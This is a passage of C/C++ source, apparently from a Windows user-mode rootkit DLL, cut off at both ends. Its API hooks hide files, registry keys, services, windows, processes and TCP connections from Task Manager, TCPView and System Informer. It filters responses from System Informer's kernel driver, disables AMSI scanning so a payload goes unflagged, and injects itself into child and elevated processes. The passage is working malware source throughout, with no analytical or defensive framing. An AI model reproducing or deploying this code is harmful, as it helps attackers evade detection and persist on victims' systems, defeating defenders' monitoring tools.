                Logf("InjResumeInject: PID=%lu wow64=%d OK", pid, (int)bWow64);
            }
        }
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
    }
    CloseHandle(hProc);
}

// ── NtResumeThread — inject DLL into new child processes immediately ─────────
NTSTATUS NTAPI HookedNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount)
{
    // GetProcessIdOfThread is the correct, safe way to get the owner PID
    DWORD childPid = GetProcessIdOfThread(ThreadHandle);
    DWORD thisPid  = GetCurrentProcessId();

    if (childPid && childPid != thisPid && !IsBlacklisted(childPid))
        InjectIntoProcess(childPid);

    return TrueNtResumeThread(ThreadHandle, SuspendCount);
}

// Forward declaration — defined later after InjectIntoProcess helpers
static bool IsProcessPidHidden(DWORD pid);

// ── Helpers for NtDeviceIoControlFile device-name check ──────────────────────
static bool IsKphHandle(HANDLE fh)
{
    EnterCriticalSection(&g_kphCS);
    for (int i = 0; i < g_kphHandleCount; i++) {
        if (g_kphHandles[i] == fh) { LeaveCriticalSection(&g_kphCS); return true; }
    }
    LeaveCriticalSection(&g_kphCS);

    if (!TrueNtQueryObject) return false;
    BYTE buf[512] = { 0 };
    if (!NT_SUCCESS(TrueNtQueryObject(fh, 1 /*ObjectNameInformation*/, buf, sizeof(buf), NULL)))
        return false;
    PUNICODE_STRING us = (PUNICODE_STRING)buf;
    if (!us->Buffer || us->Length == 0) return false;

    int kLen  = (int)(sizeof(DEVICE_KPH)  / sizeof(WCHAR)) - 1;
    int k2Len = (int)(sizeof(DEVICE_KPH2) / sizeof(WCHAR)) - 1;
    bool isKph = (_wcsnicmp(us->Buffer, DEVICE_KPH,  kLen)  == 0) ||
                 (_wcsnicmp(us->Buffer, DEVICE_KPH2, k2Len) == 0);
    if (isKph) {
        EnterCriticalSection(&g_kphCS);
        if (g_kphHandleCount < KPH_CACHE_SIZE)
            g_kphHandles[g_kphHandleCount++] = fh;
        LeaveCriticalSection(&g_kphCS);
    }
    return isKph;
}

static bool IsNsiHandle(HANDLE fh)
{
    if (!TrueNtQueryObject) return false;
    BYTE buf[512] = { 0 };
    if (!NT_SUCCESS(TrueNtQueryObject(fh, 1, buf, sizeof(buf), NULL))) return false;
    PUNICODE_STRING us = (PUNICODE_STRING)buf;
    if (!us->Buffer || us->Length == 0) return false;
    int nLen = (int)(sizeof(DEVICE_NSI) / sizeof(WCHAR)) - 1;
    return _wcsnicmp(us->Buffer, DEVICE_NSI, nLen) == 0;
}

// ── NtDeviceIoControlFile — hide TCP via NSI + filter KPH process responses ──
NTSTATUS NTAPI HookedNtDeviceIoControlFile(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode,
    PVOID InputBuffer, ULONG InputBufferLength,
    PVOID OutputBuffer, ULONG OutputBufferLength)
{
    NTSTATUS st = TrueNtDeviceIoControlFile(FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength,
        OutputBuffer, OutputBufferLength);
    // Only filter on synchronous completion — STATUS_PENDING means data isn't ready yet
    if (st != STATUS_SUCCESS) return st;

    // ── NSI: hide our TCP port from TCPView / Resource Monitor ───────────────
    // The caller allocates NSI_PARAM and passes it as OutputBuffer (not InputBuffer).
    // The kernel fills the entry arrays in-place and updates Count.
    if (IoControlCode == IOCTL_NSI_GETALLPARAM && g_hiddenPort != 0
        && OutputBuffer && OutputBufferLength == sizeof(NSI_PARAM) && IsNsiHandle(FileHandle))
    {
        PNSI_PARAM p = (PNSI_PARAM)OutputBuffer;
        if (p->Entries && (p->Type == NsiTcp || p->Type == NsiUdp) && p->Count > 0)
        {
            for (SIZE_T i = 0; i < p->Count; ) {
                PNSI_TCP_ENTRY te = (PNSI_TCP_ENTRY)((PUCHAR)p->Entries + i * p->EntrySize);
                PNSI_STATUS_ENTRY se = (p->StatusEntries && p->StatusEntrySize > 0)
                    ? (PNSI_STATUS_ENTRY)((PUCHAR)p->StatusEntries + i * p->StatusEntrySize) : NULL;
                PNSI_PROC_ENTRY pe = (p->ProcessEntries && p->ProcessEntrySize > 0)
                    ? (PNSI_PROC_ENTRY)((PUCHAR)p->ProcessEntries + i * p->ProcessEntrySize) : NULL;

                bool hide = false;
                if (p->Type == NsiTcp) {
                    WORD lPort = _byteswap_ushort(te->Local.Port);
                    WORD rPort = _byteswap_ushort(te->Remote.Port);
                    hide = (lPort == g_hiddenPort || rPort == g_hiddenPort);
                }
                if (!hide && pe) {
                    DWORD pid = (p->Type == NsiTcp) ? pe->TcpProcessId : pe->UdpProcessId;
                    if (pid && IsProcessPidHidden(pid)) hide = true;
                }

                if (hide) {
                    SIZE_T remaining = p->Count - i - 1;
                    if (remaining > 0) {
                        memmove(te, (PUCHAR)te + p->EntrySize, remaining * p->EntrySize);
                        if (se) memmove(se, (PUCHAR)se + p->StatusEntrySize, remaining * p->StatusEntrySize);
                        if (pe) memmove(pe, (PUCHAR)pe + p->ProcessEntrySize, remaining * p->ProcessEntrySize);
                    }
                    p->Count--;
                } else {
                    i++;
                }
            }
        }
    }

    // ── KPH: filter System Informer admin process list responses ─────────────
    // KPH driver returns process info in a SYSTEM_PROCESS_INFORMATION-compatible
    // buffer. We run the same filter as our NtQuerySystemInformation hook.
    if ((IoControlCode == IOCTL_KPH_COMMS || IsKphHandle(FileHandle)) &&
        IsKphHandle(FileHandle) && OutputBuffer && OutputBufferLength > 0 && g_prefixLen > 0)
    {
        // Try interpreting as SYSTEM_PROCESS_INFORMATION list at several offsets
        // to handle KPH message headers (0, 8, 16, 32 bytes)
        static const ULONG offsets[] = { 0, 8, 16, 32 };
        for (int oi = 0; oi < 4; oi++) {
            ULONG off = offsets[oi];
            if (off + sizeof(SYSTEM_PROCESS_INFORMATION) > OutputBufferLength) break;
            PSYSTEM_PROCESS_INFORMATION hdr =
                (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)OutputBuffer + off);
            if (hdr->NextEntryOffset > 0 &&
                hdr->NextEntryOffset < OutputBufferLength &&
                hdr->ImageName.Length < 512)
            {
                FilterProcessList(hdr);
                Logf("KPH: filtered process list at offset %lu", off);
                break;
            }
        }
    }

    return st;
}

// ── AmsiScanBuffer — bypass AMSI so PowerShell/WScript don't flag our payload ─
HRESULT WINAPI HookedAmsiScanBuffer(PVOID amsiContext, PVOID buffer, ULONG length,
    LPCWSTR contentName, PVOID session, PVOID* result)
{
    if (result) {
        // AMSI_RESULT_CLEAN = 1 — tells the caller the buffer is safe
        *(DWORD*)result = 1;
    }
    return S_OK;
}

// ── Directory filter (hide files by prefix) ───────────────────────────────────
// Returns the actual data length after filtering (may be smaller if head entries
// were removed via memmove). Callers must write this back to IoStatusBlock->Information.
static ULONG FilterDirectoryBuffer(PVOID Buffer, ULONG Length, FILE_INFORMATION_CLASS InfoClass)
{
    if (!Buffer || Length == 0) return Length;
    PUCHAR base = (PUCHAR)Buffer;
    PUCHAR cur  = base;
    PUCHAR end  = base + Length;
    PUCHAR prev = NULL;

    while (cur + sizeof(ULONG) <= end) {
        ULONG nextOffset = *(ULONG*)(cur);
        if (nextOffset != 0 && (cur + nextOffset > end || nextOffset > Length)) {
            Logf("FilterDirectoryBuffer: malformed next=%lu, aborting", nextOffset);
            break;
        }

        WCHAR* nameW = NULL;
        ULONG  nameLen = 0;

        switch (InfoClass) {
        case FileBothDirectoryInformation: {
            PFILE_BOTH_DIR_INFORMATION e = (PFILE_BOTH_DIR_INFORMATION)cur;
            nameW = e->FileName; nameLen = e->FileNameLength;
            break;
        }
        case FileIdBothDirectoryInformation: {
            PFILE_ID_BOTH_DIR_INFORMATION e = (PFILE_ID_BOTH_DIR_INFORMATION)cur;
            nameW = e->FileName; nameLen = e->FileNameLength;
            break;
        }
        default: {
            PFILE_DIRECTORY_INFORMATION e = (PFILE_DIRECTORY_INFORMATION)cur;
            nameW = e->FileName; nameLen = e->FileNameLength;
            break;
        }
        }

        char nameA[MAX_PATH] = { 0 };
        if (nameW && nameLen > 0) {
            ULONG clamp = nameLen;
            if (clamp > (ULONG)((MAX_PATH - 1) * sizeof(WCHAR))) clamp = (ULONG)((MAX_PATH - 1) * sizeof(WCHAR));
            UnicodeToLowerAnsiSafe(nameW, clamp, nameA, sizeof(nameA));
        }

        bool hide = false;
        if (nameA[0] != '\0') {
            const char* target = nameA;
            // Strip any leading path separators if present
            const char* sep = strrchr(nameA, '\\');
            if (!sep) sep = strrchr(nameA, '/');
            if (sep) target = sep + 1;
            if (PrefixMatch(target)) hide = true;
        }

        if (hide) {
            Logf("Hiding file entry: '%s' (PID=%lu)", nameA, GetCurrentProcessId());
            if (nextOffset == 0) {
                if (prev) *(ULONG*)prev = 0;
                break;
            }
            else {
                if (prev) {
                    ULONG prevNext = *(ULONG*)prev;
                    *(ULONG*)prev = (prevNext == 0) ? nextOffset : prevNext + nextOffset;
                }
                else {
                    // Remove head entry by shifting remaining buffer left
                    PUCHAR src = cur + nextOffset;
                    ULONG remaining = (ULONG)(end - src);
                    if (remaining > 0) memmove(cur, src, remaining);
                    end -= nextOffset;
                    Length -= nextOffset;
                    // cur now points to the next entry — don't advance prev
                    continue;
                }
            }
        }
        else {
            prev = cur;
        }

        if (nextOffset == 0) break;
        cur += nextOffset;
    }
    // Length was decremented for every head-entry memmove; return it so callers
    // can update IoStatusBlock->Information (prevents reading past valid data).
    return Length;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
    NTSTATUS st = TrueNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length, FileInformationClass,
        ReturnSingleEntry, FileName, RestartScan);

    // Only filter on synchronous success. NT_SUCCESS includes STATUS_PENDING (0x103),
    // where IoStatusBlock->Information is not yet valid — accessing it risks reading
    // uninitialized memory and corrupting Explorer's directory listing.
    ULONG dataLen = (st == STATUS_SUCCESS && IoStatusBlock && IoStatusBlock->Information > 0)
        ? (ULONG)IoStatusBlock->Information : 0;
    if (st == STATUS_SUCCESS && FileInformation && dataLen > 0 && g_prefixLen > 0) {
        switch (FileInformationClass) {
        case FileDirectoryInformation:
        case FileFullDirectoryInformation:
        case FileBothDirectoryInformation:
        case FileNamesInformation:
        case FileIdBothDirectoryInformation:
        case FileIdFullDirectoryInformation:
        case FileIdExtdDirectoryInformation: {
            ULONG filtered = FilterDirectoryBuffer(FileInformation, dataLen, FileInformationClass);
            // Write back actual byte count so callers don't read past the valid linked list
            if (IoStatusBlock && filtered != dataLen)
                IoStatusBlock->Information = filtered;
            break;
        }
        default:
            break;
        }
    }
    return st;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
    HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName)
{
    NTSTATUS st = TrueNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length, FileInformationClass,
        ReturnSingleEntry, FileName);

    ULONG dataLenEx = (st == STATUS_SUCCESS && IoStatusBlock && IoStatusBlock->Information > 0)
        ? (ULONG)IoStatusBlock->Information : 0;
    if (st == STATUS_SUCCESS && FileInformation && dataLenEx > 0 && g_prefixLen > 0) {
        switch (FileInformationClass) {
        case FileDirectoryInformation:
        case FileFullDirectoryInformation:
        case FileBothDirectoryInformation:
        case FileNamesInformation:
        case FileIdBothDirectoryInformation:
        case FileIdFullDirectoryInformation:
        case FileIdExtdDirectoryInformation: {
            ULONG filtered = FilterDirectoryBuffer(FileInformation, dataLenEx, FileInformationClass);
            if (IoStatusBlock && filtered != dataLenEx)
                IoStatusBlock->Information = filtered;
            break;
        }
        default:
            break;
        }
    }
    return st;
}

// ── TLS for registry enumeration caching ────────────────────────────────────
static DWORD gTls_EnumerateKey_CacheKey       = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateKey_CacheIndex     = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateKey_CacheI         = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateKey_CacheCorrected = TLS_OUT_OF_INDEXES;

static DWORD gTls_EnumerateValueKey_CacheKey       = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateValueKey_CacheIndex     = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateValueKey_CacheI         = TLS_OUT_OF_INDEXES;
static DWORD gTls_EnumerateValueKey_CacheCorrected = TLS_OUT_OF_INDEXES;

// ── NtQueryKey (hide key by prefix) ─────────────────────────────────────────
NTSTATUS NTAPI HookedNtQueryKey(HANDLE Key, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength)
{
    NTSTATUS st = TrueNtQueryKey(Key, KeyInformationClass, KeyInformation, Length, ResultLength);
    if (!NT_SUCCESS(st) || !KeyInformation) return st;

    switch (KeyInformationClass) {
    case KeyNameInformation: {
        PKEY_NAME_INFORMATION info = (PKEY_NAME_INFORMATION)KeyInformation;
        if (PrefixMatchW(info->Name, info->NameLength)) {
            Logf("Hiding key via NtQueryKey(NameInformation)");
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        break;
    }
    case KeyBasicInformation: {
        PKEY_BASIC_INFORMATION info = (PKEY_BASIC_INFORMATION)KeyInformation;
        if (PrefixMatchW(info->Name, info->NameLength)) {
            Logf("Hiding key via NtQueryKey(BasicInformation)");
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        break;
    }
    case KeyHandleTagsInformation:
        // Don't block globally — breaks regedit
        break;
    default:
        break;
    }
    return st;
}

// ── NtEnumerateKey (skip hidden keys, TLS-cached index remapping) ────────────
NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE Key, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG KeyInformationLength, PULONG ResultLength)
{
    if (KeyInformationClass == KeyNodeInformation)
        return TrueNtEnumerateKey(Key, Index, KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);

    HANDLE cacheKey = NULL; ULONG cacheIndex = 0, cacheI = 0, cacheCorrected = 0;
    if (gTls_EnumerateKey_CacheKey != TLS_OUT_OF_INDEXES) {
        cacheKey       = (HANDLE)TlsGetValue(gTls_EnumerateKey_CacheKey);
        cacheIndex     = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateKey_CacheIndex);
        cacheI         = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateKey_CacheI);
        cacheCorrected = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateKey_CacheCorrected);
    }

    ULONG i = 0, corrected = 0;
    if (cacheKey == Key && Index > 0 && cacheIndex == Index - 1) {
        i = cacheI; corrected = cacheCorrected + 1;
    }

    BYTE tmp[1024];
    PKEY_BASIC_INFORMATION info = (PKEY_BASIC_INFORMATION)tmp;

    for (; i <= Index; corrected++) {
        NTSTATUS s = TrueNtEnumerateKey(Key, corrected, KeyBasicInformation, info, sizeof(tmp), ResultLength);
        if (!NT_SUCCESS(s))
            return TrueNtEnumerateKey(Key, corrected, KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
        if (!PrefixMatchW(info->Name, info->NameLength)) i++;
    }

    if (corrected > 0) corrected--;
    if (gTls_EnumerateKey_CacheKey != TLS_OUT_OF_INDEXES) {
        TlsSetValue(gTls_EnumerateKey_CacheKey,       (PVOID)Key);
        TlsSetValue(gTls_EnumerateKey_CacheIndex,     (PVOID)(ULONG_PTR)Index);
        TlsSetValue(gTls_EnumerateKey_CacheI,         (PVOID)(ULONG_PTR)i);
        TlsSetValue(gTls_EnumerateKey_CacheCorrected, (PVOID)(ULONG_PTR)corrected);
    }
    return TrueNtEnumerateKey(Key, corrected, KeyInformationClass, KeyInformation, KeyInformationLength, ResultLength);
}

// ── NtEnumerateValueKey (skip hidden values, TLS-cached) ─────────────────────
NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE Key, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG KeyValueInformationLength, PULONG ResultLength)
{
    HANDLE cacheKey = NULL; ULONG cacheIndex = 0, cacheI = 0, cacheCorrected = 0;
    if (gTls_EnumerateValueKey_CacheKey != TLS_OUT_OF_INDEXES) {
        cacheKey       = (HANDLE)TlsGetValue(gTls_EnumerateValueKey_CacheKey);
        cacheIndex     = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateValueKey_CacheIndex);
        cacheI         = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateValueKey_CacheI);
        cacheCorrected = (ULONG)(ULONG_PTR)TlsGetValue(gTls_EnumerateValueKey_CacheCorrected);
    }

    ULONG i = 0, corrected = 0;
    if (cacheKey == Key && Index > 0 && cacheIndex == Index - 1) {
        i = cacheI; corrected = cacheCorrected + 1;
    }

    BYTE tmp[2048];
    PKEY_VALUE_BASIC_INFORMATION vinfo = (PKEY_VALUE_BASIC_INFORMATION)tmp;

    for (; i <= Index; corrected++) {
        NTSTATUS s = TrueNtEnumerateValueKey(Key, corrected, KeyValueBasicInformation, vinfo, sizeof(tmp), ResultLength);
        if (!NT_SUCCESS(s))
            return TrueNtEnumerateValueKey(Key, corrected, KeyValueInformationClass, KeyValueInformation, KeyValueInformationLength, ResultLength);
        if (!PrefixMatchW(vinfo->Name, vinfo->NameLength)) i++;
        else {
            char vname[128] = {0};
            UnicodeToLowerAnsiSafe(vinfo->Name, vinfo->NameLength, vname, sizeof(vname));
            Logf("Hiding registry value: '%s' (PID=%lu)", vname, GetCurrentProcessId());
        }
    }

    if (corrected > 0) corrected--;
    if (gTls_EnumerateValueKey_CacheKey != TLS_OUT_OF_INDEXES) {
        TlsSetValue(gTls_EnumerateValueKey_CacheKey,       (PVOID)Key);
        TlsSetValue(gTls_EnumerateValueKey_CacheIndex,     (PVOID)(ULONG_PTR)Index);
        TlsSetValue(gTls_EnumerateValueKey_CacheI,         (PVOID)(ULONG_PTR)i);
        TlsSetValue(gTls_EnumerateValueKey_CacheCorrected, (PVOID)(ULONG_PTR)corrected);
    }
    return TrueNtEnumerateValueKey(Key, corrected, KeyValueInformationClass, KeyValueInformation, KeyValueInformationLength, ResultLength);
}

// ── IsProcessPidHidden — check if PID belongs to a hidden process ─────────────
static bool IsProcessPidHidden(DWORD pid)
{
    WCHAR img[MAX_PATH] = { 0 };
    DWORD sz = MAX_PATH;
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return false;
    QueryFullProcessImageNameW(h, 0, img, &sz);
    CloseHandle(h);
    WCHAR* base = wcsrchr(img, L'\\');
    const WCHAR* nameW = base ? base + 1 : img;
    char nameA[MAX_PATH] = { 0 };
    WideCharToMultiByte(CP_ACP, 0, nameW, -1, nameA, sizeof(nameA), NULL, NULL);
    for (int i = 0; nameA[i]; i++) nameA[i] = (char)tolower(nameA[i]);
    return ShouldHideProcess(nameA);
}

// ── NtUserBuildHwndList — hide windows of hidden processes from Task Manager ──
NTSTATUS NTAPI HookedNtUserBuildHwndList(HDESK desktop, HWND hwndNext, BOOL enumChildren,
    BOOL removeImmersive, DWORD threadID, ULONG maxItems, HWND* itemBuffer, PULONG itemCount)
{
    NTSTATUS st = TrueNtUserBuildHwndList(desktop, hwndNext, enumChildren, removeImmersive,
                                           threadID, maxItems, itemBuffer, itemCount);
    if (NT_SUCCESS(st) && itemBuffer && itemCount) {
        for (ULONG i = 0; i < *itemCount; ) {
            DWORD pid = 0;
            if (GetWindowThreadProcessId(itemBuffer[i], &pid) && pid && IsProcessPidHidden(pid)) {
                memmove(&itemBuffer[i], &itemBuffer[i + 1], (*itemCount - i - 1) * sizeof(HWND));
                (*itemCount)--;
            } else {
                i++;
            }
        }
    }
    return st;
}

// ── Service filter helpers ─────────────────────────────────────────────────────
static void FilterEnumServiceStatusW(LPENUM_SERVICE_STATUSW svcs, LPDWORD count)
{
    for (DWORD i = 0; i < *count; ) {
        char nameA[256] = { 0 }, dispA[256] = { 0 };
        if (svcs[i].lpServiceName)
            WideCharToMultiByte(CP_ACP, 0, svcs[i].lpServiceName, -1, nameA, sizeof(nameA)-1, NULL, NULL);
        if (svcs[i].lpDisplayName)
            WideCharToMultiByte(CP_ACP, 0, svcs[i].lpDisplayName, -1, dispA, sizeof(dispA)-1, NULL, NULL);
        for (int j = 0; nameA[j]; j++) nameA[j] = (char)tolower(nameA[j]);
        for (int j = 0; dispA[j]; j++) dispA[j] = (char)tolower(dispA[j]);
        if (PrefixMatch(nameA) || PrefixMatch(dispA)) {
            Logf("Service hidden (W): %s", nameA);
            memmove(&svcs[i], &svcs[i+1], (*count - i - 1) * sizeof(ENUM_SERVICE_STATUSW));
            memset(&svcs[*count - 1], 0, sizeof(ENUM_SERVICE_STATUSW));
            (*count)--;
        } else { i++; }
    }
}
static void FilterEnumServiceStatusA(LPENUM_SERVICE_STATUSA svcs, LPDWORD count)
{
    for (DWORD i = 0; i < *count; ) {
        char nameA[256] = { 0 }, dispA[256] = { 0 };
        if (svcs[i].lpServiceName) strcpy_s(nameA, svcs[i].lpServiceName);
        if (svcs[i].lpDisplayName) strcpy_s(dispA, svcs[i].lpDisplayName);
        for (int j = 0; nameA[j]; j++) nameA[j] = (char)tolower(nameA[j]);
        for (int j = 0; dispA[j]; j++) dispA[j] = (char)tolower(dispA[j]);
        if (PrefixMatch(nameA) || PrefixMatch(dispA)) {
            Logf("Service hidden (A): %s", nameA);
            memmove(&svcs[i], &svcs[i+1], (*count - i - 1) * sizeof(ENUM_SERVICE_STATUSA));
            memset(&svcs[*count - 1], 0, sizeof(ENUM_SERVICE_STATUSA));
            (*count)--;
        } else { i++; }
    }
}
static void FilterEnumServiceStatusProcessW(LPENUM_SERVICE_STATUS_PROCESSW svcs, LPDWORD count)
{
    for (DWORD i = 0; i < *count; ) {
        char nameA[256] = { 0 }, dispA[256] = { 0 };
        if (svcs[i].lpServiceName)
            WideCharToMultiByte(CP_ACP, 0, svcs[i].lpServiceName, -1, nameA, sizeof(nameA)-1, NULL, NULL);
        if (svcs[i].lpDisplayName)
            WideCharToMultiByte(CP_ACP, 0, svcs[i].lpDisplayName, -1, dispA, sizeof(dispA)-1, NULL, NULL);
        for (int j = 0; nameA[j]; j++) nameA[j] = (char)tolower(nameA[j]);
        for (int j = 0; dispA[j]; j++) dispA[j] = (char)tolower(dispA[j]);
        if (PrefixMatch(nameA) || PrefixMatch(dispA)) {
            Logf("ServiceEx hidden (W): %s", nameA);
            memmove(&svcs[i], &svcs[i+1], (*count - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
            memset(&svcs[*count - 1], 0, sizeof(ENUM_SERVICE_STATUS_PROCESSW));
            (*count)--;
        } else { i++; }
    }
}
static void FilterEnumServiceStatusProcessA(LPENUM_SERVICE_STATUS_PROCESSA svcs, LPDWORD count)
{
    for (DWORD i = 0; i < *count; ) {
        char nameA[256] = { 0 }, dispA[256] = { 0 };
        if (svcs[i].lpServiceName) strcpy_s(nameA, svcs[i].lpServiceName);
        if (svcs[i].lpDisplayName) strcpy_s(dispA, svcs[i].lpDisplayName);
        for (int j = 0; nameA[j]; j++) nameA[j] = (char)tolower(nameA[j]);
        for (int j = 0; dispA[j]; j++) dispA[j] = (char)tolower(dispA[j]);
        if (PrefixMatch(nameA) || PrefixMatch(dispA)) {
            Logf("ServiceEx hidden (A): %s", nameA);
            memmove(&svcs[i], &svcs[i+1], (*count - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSA));
            memset(&svcs[*count - 1], 0, sizeof(ENUM_SERVICE_STATUS_PROCESSA));
            (*count)--;
        } else { i++; }
    }
}

// ── Service hooks ─────────────────────────────────────────────────────────────
BOOL WINAPI HookedEnumServicesStatusA(SC_HANDLE hSCM, DWORD type, DWORD state,
    LPENUM_SERVICE_STATUSA svcs, DWORD len, LPDWORD need, LPDWORD returned, LPDWORD resume)
{
    BOOL r = TrueEnumServicesStatusA(hSCM, type, state, svcs, len, need, returned, resume);
    if (r && svcs && returned) FilterEnumServiceStatusA(svcs, returned);
    return r;
}
BOOL WINAPI HookedEnumServicesStatusW(SC_HANDLE hSCM, DWORD type, DWORD state,
    LPENUM_SERVICE_STATUSW svcs, DWORD len, LPDWORD need, LPDWORD returned, LPDWORD resume)
{
    BOOL r = TrueEnumServicesStatusW(hSCM, type, state, svcs, len, need, returned, resume);
    if (r && svcs && returned) FilterEnumServiceStatusW(svcs, returned);
    return r;
}
BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE hSCM, DWORD type, DWORD state,
    LPBYTE svcs, DWORD len, LPDWORD need, LPDWORD returned, LPDWORD resume, LPVOID reserved)
{
    BOOL r = TrueEnumServiceGroupW(hSCM, type, state, svcs, len, need, returned, resume, reserved);
    if (r && svcs && returned) FilterEnumServiceStatusW((LPENUM_SERVICE_STATUSW)svcs, returned);
    return r;
}
BOOL WINAPI HookedEnumServicesStatusExA(SC_HANDLE hSCM, SC_ENUM_TYPE lvl, DWORD type, DWORD state,
    LPBYTE svcs, DWORD len, LPDWORD need, LPDWORD returned, LPDWORD resume, LPCSTR group)
{
    BOOL r = TrueEnumServicesStatusExA(hSCM, lvl, type, state, svcs, len, need, returned, resume, group);
    if (r && svcs && returned) FilterEnumServiceStatusProcessA((LPENUM_SERVICE_STATUS_PROCESSA)svcs, returned);
    return r;
}
BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE hSCM, SC_ENUM_TYPE lvl, DWORD type, DWORD state,
    LPBYTE svcs, DWORD len, LPDWORD need, LPDWORD returned, LPDWORD resume, LPCWSTR group)
{
    BOOL r = TrueEnumServicesStatusExW(hSCM, lvl, type, state, svcs, len, need, returned, resume, group);
    if (r && svcs && returned) FilterEnumServiceStatusProcessW((LPENUM_SERVICE_STATUS_PROCESSW)svcs, returned);
    return r;
}
BOOL WINAPI HookedEnumServicesStatusExW2(SC_HANDLE hSCM, SC_ENUM_TYPE lvl, DWORD type, DWORD state,
    LPBYTE svcs, DWORD len, LPDWORD need, LPDWORD returned, LPDWORD resume, LPCWSTR group)
{
    BOOL r = TrueEnumServicesStatusExW2(hSCM, lvl, type, state, svcs, len, need, returned, resume, group);
    if (r && svcs && returned) FilterEnumServiceStatusProcessW((LPENUM_SERVICE_STATUS_PROCESSW)svcs, returned);
    return r;
}

// ── TCP hook: hide connections on g_hiddenPort ───────────────────────────────
typedef DWORD(WINAPI* GetExtendedTcpTable_t)(PVOID, PDWORD, BOOL, ULONG, TCP_TABLE_CLASS, ULONG);
static GetExtendedTcpTable_t TrueGetExtendedTcpTable = nullptr;

DWORD WINAPI HookedGetExtendedTcpTable(PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder, ULONG ulAf, TCP_TABLE_CLASS TableClass, ULONG Reserved)
{
    DWORD ret = TrueGetExtendedTcpTable(pTcpTable, pdwSize, bOrder, ulAf, TableClass, Reserved);
    if (ret != NO_ERROR || !pTcpTable || g_hiddenPort == 0) return ret;

    if (ulAf == AF_INET && (TableClass == TCP_TABLE_OWNER_PID_ALL || TableClass == TCP_TABLE_OWNER_PID_CONNECTIONS || TableClass == TCP_TABLE_OWNER_PID_LISTENER)) {
        PMIB_TCPTABLE_OWNER_PID table = (PMIB_TCPTABLE_OWNER_PID)pTcpTable;
        for (DWORD i = 0; i < table->dwNumEntries; ) {
            USHORT lp = ntohs((USHORT)table->table[i].dwLocalPort);
            USHORT rp = ntohs((USHORT)table->table[i].dwRemotePort);
            if (lp == g_hiddenPort || rp == g_hiddenPort) {
                Logf("Hiding TCP: local=%u remote=%u", lp, rp);
                for (DWORD j = i; j < table->dwNumEntries - 1; j++)
                    table->table[j] = table->table[j + 1];
                table->dwNumEntries--;
            } else { i++; }
        }
    }
    else if (ulAf == AF_INET && (TableClass == TCP_TABLE_BASIC_ALL || TableClass == TCP_TABLE_BASIC_CONNECTIONS || TableClass == TCP_TABLE_BASIC_LISTENER)) {
        PMIB_TCPTABLE table = (PMIB_TCPTABLE)pTcpTable;
        for (DWORD i = 0; i < table->dwNumEntries; ) {
            USHORT lp = ntohs((USHORT)table->table[i].dwLocalPort);
            USHORT rp = ntohs((USHORT)table->table[i].dwRemotePort);
            if (lp == g_hiddenPort || rp == g_hiddenPort) {
                for (DWORD j = i; j < table->dwNumEntries - 1; j++)
                    table->table[j] = table->table[j + 1];
                table->dwNumEntries--;
            } else { i++; }
        }
    }
    return ret;
}

// ── Periodic spray thread (elevated only) ───────────────────────────────────
// Runs every 2 seconds and injects our DLL into any new processes we haven't
// hit yet — specifically catches elevated processes (TCPView, Autoruns as admin)
// that can't be reached by the per-process NtResumeThread hook.
static DWORD WINAPI SprayThread(LPVOID)
{
    Sleep(1500); // let hooks settle first
    while (true) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            pe.dwSize = sizeof(pe);
            DWORD self = GetCurrentProcessId();
            if (Process32FirstW(snap, &pe)) {
                do {
                    DWORD pid = pe.th32ProcessID;
                    if (pid == self || pid == 0 || pid == 4) continue;
                    if (IsBlacklistedName(pe.szExeFile)) continue;
